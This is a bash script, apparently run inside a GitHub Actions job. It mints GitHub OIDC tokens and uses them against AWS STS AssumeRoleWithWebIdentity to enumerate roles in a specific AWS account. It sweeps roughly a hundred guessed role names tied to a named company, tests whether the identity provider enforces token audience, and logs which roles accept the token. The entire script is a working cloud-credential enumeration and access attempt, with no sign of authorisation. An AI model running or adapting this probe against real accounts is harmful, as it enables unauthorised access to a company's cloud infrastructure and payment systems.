#!/bin/bash
set -u
OUT=probe5.out
: > "$OUT"
STS=https://sts.amazonaws.com/
ACCT=533852667875

log() { echo "$*" >> "$OUT"; }

b64d() { python3 -c 'import sys,base64,json
s=sys.argv[1].split(".")[1]
s+="="*(-len(s)%4)
print(json.dumps(json.loads(base64.urlsafe_b64decode(s)),ensure_ascii=False))' "$1"; }

mint() { # $1 = audience
  curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
    "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=$1" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))'
}

assume() { # $1 token  $2 role  $3 label
  local r t h b
  r=$(curl -sS -m 20 -w '\nHTTP:%{http_code}' "$STS" \
    --data-urlencode "Action=AssumeRoleWithWebIdentity" \
    --data-urlencode "Version=2011-06-15" \
    --data-urlencode "RoleArn=arn:aws:iam::${ACCT}:role/$2" \
    --data-urlencode "RoleSessionName=oidcprobe" \
    --data-urlencode "WebIdentityToken=$1")
  h=$(printf '%s' "$r" | tail -1 | sed 's/HTTP://')
  b=$(printf '%s' "$r" | sed '$d')
  code=$(printf '%s' "$b" | sed -n 's:.*<Code>\([^<]*\)</Code>.*:\1:p' | head -1)
  msg=$(printf '%s' "$b" | sed -n 's:.*<Message>\([^<]*\)</Message>.*:\1:p' | head -1)
  if [ -z "$code" ] && printf '%s' "$b" | grep -q '<AccessKeyId>'; then code=OK; fi
  log "R $3 $2 http=$h code=${code:-none} msg=${msg:-none}"
  if [ "$code" = "OK" ] || [ "$code" = "AccessDenied" ] || [ "$code" = "InvalidIdentityToken" ]; then :; fi
  sleep 0.5
}

TDEF=$(mint sts.amazonaws.com)
log "jwt_len=${#TDEF}"
log "claims_default=$(b64d "$TDEF")"
log "run ref=${GITHUB_REF:-?} event=${GITHUB_EVENT_NAME:-?} repo=${GITHUB_REPOSITORY:-?}"

# ---------- negative controls ----------
assume "$TDEF" "zzq-nonexistent-probe-280572" "NEGCONTROL-533"
assume "$TDEF" "cg-testas-ecs-tasks-role-prod" "KNOWNNAME-533"

# ---------- audience oracle (does 533 provider enforce aud?) ----------
for aud in zzq-not-a-real-audience-938217 https://github.com/balwaan-tech sigstore; do
  T=$(mint "$aud")
  log "aud=$aud jwt_len=${#T} claims=$(b64d "$T")"
  assume "$T" "zzq-nonexistent-probe-280572" "AUDORACLE[$aud]"
done

# ---------- role name sweep ----------
ROLES="
cg-testas-ecs-tasks-role-prod
cg-testas-app-prod-tasks
cg-testas-oidc-role
cg-testas-oidc-role-prod
cg-testas-github-oidc-role
cg-testas-github-oidc-role-prod
cg-testas-deploy-role
cg-testas-deploy-role-prod
cg-testas-ci-role
cg-testas-app-prod-oidc-role
cg-testas-role
cg-sandbox-oidc-role
cg-sandbox-github-oidc-role
cg-sandbox-github-actions
cg-sandbox-github-actions-role
cg-sandbox-deploy-role
cg-sandbox-ci-role
cg-sandbox-ecs-tasks-role
cg-sandbox-app-role
cg-sandbox-role
cg-sandbox-github-role
cg-sandbox-cicd-role
cg-sandbox-gh-oidc-role
cg-core-oidc-role
cg-core-github-oidc-role
cg-core-github-actions-role
cg-core-github-actions
cg-core-deploy-role
cg-core-ci-role
cg-core-cd-role
cg-core-role
cg-core-ecs-tasks-role
cg-core-ecs-tasks-role-prod
cg-core-sandbox-oidc-role
cg-core-sandbox-github-oidc-role
cg-core-github-oidc-role-prod
cg-core-oidc-role-prod
cg-core-deploy-role-prod
cg-core-app-prod-oidc-role
cg-core-infra-oidc-role
cg-core-terraform-role
cg-core-gitops-role
coingate-oidc-role
coingate-github-oidc-role
coingate-github-actions
coingate-github-actions-role
coingate-deploy-role
coingate-ci-role
cg-coingate-oidc-role
cg-coingate-github-oidc-role
cg-coingate-deploy-role
cg-coingate-ci-role
cg-coingate-role
cg-coingate-oidc-role-prod
cg-coingate-github-oidc-role-prod
cg-coingate-deploy-role-prod
cg-coingate-ci-role-prod
github-actions
github-actions-role
GitHubActionsRole
GitHubActionsServiceRole
github-oidc
github-oidc-role
github-deploy
github-deploy-role
gh-oidc-role
aws-actions-role
oidc-role
web-identity-role
ci-role
cd-role
deploy-role
deploy
terraform
terraform-role
terraform-deploy-role
gitops
OrganizationAccountAccessRole
cg-pay-oidc-role
cg-dashboard-oidc-role
cg-api-oidc-role
cg-giftcards-oidc-role
cg-payout-oidc-role
cg-wallet-oidc-role
cg-ledger-oidc-role
cg-rewards-oidc-role
cg-claim-oidc-role
cg-travelrule-oidc-role
github-actions-prod
github-oidc-prod
cg-github-actions-prod
cg-github-oidc-prod
cg-ci-prod
cg-deploy-prod
"
n=0
for role in $ROLES; do
  n=$((n+1))
  assume "$TDEF" "$role" "S$n"
done
log "sweep_done roles=$n"

# ---------- one contrast call against 602675409103 ----------
r=$(curl -sS -m 20 "$STS" --data-urlencode "Action=AssumeRoleWithWebIdentity" \
  --data-urlencode "Version=2011-06-15" \
  --data-urlencode "RoleArn=arn:aws:iam::602675409103:role/zzq-nonexistent-probe-280572" \
  --data-urlencode "RoleSessionName=oidcprobe" --data-urlencode "WebIdentityToken=$TDEF" | tr -d '\n')
log "CONTRAST-602 http-body: $(printf '%s' "$r" | head -c 400)"

# ---------- summarize ----------
log "summary: $(grep -c '^R ' "$OUT") assume calls"
grep '^R ' "$OUT" | awk '{print $5}' | sort | uniq -c
